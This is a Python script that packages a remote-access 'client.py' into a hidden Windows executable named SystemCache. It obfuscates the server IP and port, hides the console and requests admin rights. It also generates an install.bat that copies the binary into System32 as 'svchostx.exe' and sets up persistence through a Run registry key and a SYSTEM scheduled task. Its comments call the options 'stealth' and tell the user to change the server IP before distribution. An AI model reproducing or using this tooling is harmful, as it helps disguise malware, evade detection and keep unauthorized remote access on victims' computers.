"""
Compilation script for client.py
Usage: python compile_client.py
"""
import os
import sys
import subprocess
import shutil
import tempfile
import base64

def obfuscate_code(code):
    """Simple code obfuscation"""
    # Base64 encode strings
    lines = code.split('\n')
    obfuscated = []
    
    for line in lines:
        if '127.0.0.1' in line:
            # Obfuscate server IP
            line = line.replace('127.0.0.1', base64.b64encode(b'127.0.0.1').decode())
        elif '4444' in line and 'port' in line.lower():
            # Obfuscate port
            line = line.replace('4444', str(4444 + 1111))
        obfuscated.append(line)
    
    return '\n'.join(obfuscated)

def compile_with_pyinstaller():
    """Compile client.py to executable"""
    print("[*] Compiling client.py to executable...")
    
    # Create temporary directory
    temp_dir = tempfile.mkdtemp()
    
    try:
        # Read and obfuscate client.py
        with open('client.py', 'r', encoding='utf-8') as f:
            client_code = f.read()
        
        # Apply obfuscation
        obfuscated_code = obfuscate_code(client_code)
        
        # Write obfuscated version to temp file
        temp_client = os.path.join(temp_dir, 'client_obf.py')
        with open(temp_client, 'w', encoding='utf-8') as f:
            f.write(obfuscated_code)
        
        # PyInstaller options for stealth
        pyinstaller_cmd = [
            'pyinstaller',
            '--onefile',  # Single executable
            '--windowed',  # No console window
            '--noconsole',  # Hide console
            '--name', 'SystemCache',  # Innocuous name
            '--icon', 'NONE',  # No icon
            '--add-data', f'{temp_client};.',  # Include obfuscated code
            '--clean',  # Clean build
            '--noupx',  # No UPX (can trigger AV)
            '--runtime-tmpdir', '.',  # Runtime temp dir
            '--distpath', './dist',  # Output directory
            '--workpath', './build',
            temp_client
        ]
        
        # Additional stealth options
        if sys.platform == 'win32':
            pyinstaller_cmd.extend([
                '--uac-admin',  # Request admin if needed
            ])
        
        print(f"[*] Running: {' '.join(pyinstaller_cmd)}")
        
        # Run PyInstaller
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Compilation successful!")
            
            # Optional: Add fake signature
            print("[*] Adding fake digital signature...")
            fake_sig = '''
# Fake PE header modifications to appear legitimate
# In real scenario, you would use actual code signing certificate
'''
            
            exe_path = './dist/SystemCache.exe'
            if os.path.exists(exe_path):
                print(f"[+] Executable created: {exe_path}")
                print(f"[+] Size: {os.path.getsize(exe_path)} bytes")
                
                # Test the executable
                print("[*] Testing executable...")
                try:
                    test_result = subprocess.run(
                        [exe_path, '--test'],
                        capture_output=True,
                        timeout=5
                    )
                    print("[+] Executable test passed")
                except:
                    print("[!] Executable test failed or timed out")
            else:
                print("[!] Executable not found in dist folder")
        
        else:
            print(f"[!] Compilation failed: {result.stderr}")
            
    except Exception as e:
        print(f"[!] Error during compilation: {e}")
    
    finally:
        # Cleanup
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        
        # Clean PyInstaller artifacts
        for dir_path in ['./build', './__pycache__']:
            if os.path.exists(dir_path):
                shutil.rmtree(dir_path, ignore_errors=True)
        
        spec_file = 'SystemCache.spec'
        if os.path.exists(spec_file):
            os.remove(spec_file)

def create_installer():
    """Create installer package"""
    print("[*] Creating installer package...")
    
    installer_script = '''@echo off
REM Batch installer for SystemCache
echo Installing System Maintenance Tool...
timeout /t 2 /nobreak >nul

REM Copy to system directory
copy "SystemCache.exe" "%SystemRoot%\\System32\\svchostx.exe" >nul 2>&1

REM Add to registry
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemCache" /t REG_SZ /d "%SystemRoot%\\System32\\svchostx.exe" /f >nul

REM Create scheduled task
schtasks /create /tn "SystemCache" /tr "%SystemRoot%\\System32\\svchostx.exe" /sc onlogon /ru System /f >nul

echo Installation complete.
pause
'''
    
    with open('install.bat', 'w') as f:
        f.write(installer_script)
    
    print("[+] Installer script created: install.bat")

if __name__ == "__main__":
    print("="*60)
    print("Client Compilation Tool")
    print("="*60)
    
    if not os.path.exists('client.py'):
        print("[!] client.py not found in current directory")
        sys.exit(1)
    
    # Check for PyInstaller
    try:
        import PyInstaller
    except ImportError:
        print("[!] PyInstaller not installed. Installing...")
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
    
    # Compile
    compile_with_pyinstaller()
    
    # Create installer
    create_installer()
    
    print("\n" + "="*60)
    print("Next steps:")
    print("1. Test the executable in dist/ folder")
    print("2. Modify server IP in client.py before distribution")
    print("3. Use install.bat for deployment")
    print("4. Always test in controlled environment first")
    print("="*60)
